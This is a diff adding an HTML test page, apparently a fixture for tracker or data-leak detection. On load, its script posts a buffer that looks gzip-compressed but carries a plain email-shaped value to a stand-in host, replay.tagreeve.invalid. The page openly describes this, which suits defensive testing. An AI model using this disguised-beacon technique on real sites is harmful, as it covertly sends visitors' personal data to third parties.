@@ -1,0 +1,27 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<title>Compressed beacon</title>
+</head>
+<body>
+<h1>Compressed beacon</h1>
+<p>On load the page posts a compressed-looking body as text/plain to replay.tagreeve.invalid. Its bytes spell an email-shaped value.</p>
+<script>
+  var bytes = new Uint8Array(400);
+  var seed = 7;
+  for (var i = 0; i < bytes.length; i++) {
+    seed = (seed * 1103515245 + 12345) & 0x7fffffff;
+    bytes[i] = 0x80 + ((seed >> 16) & 0x7f);
+  }
+  bytes.set([0x1f, 0x8b, 0x08, 0x00], 0);
+  var email = 'visitor@other-person.example';
+  for (var j = 0; j < email.length; j++) bytes[100 + j] = email.charCodeAt(j);
+  fetch('https://replay.tagreeve.invalid/collect', {
+    method: 'POST',
+    headers: { 'content-type': 'text/plain;charset=UTF-8' },
+    body: bytes,
+  }).catch(function () {});
+</script>
+</body>
+</html>
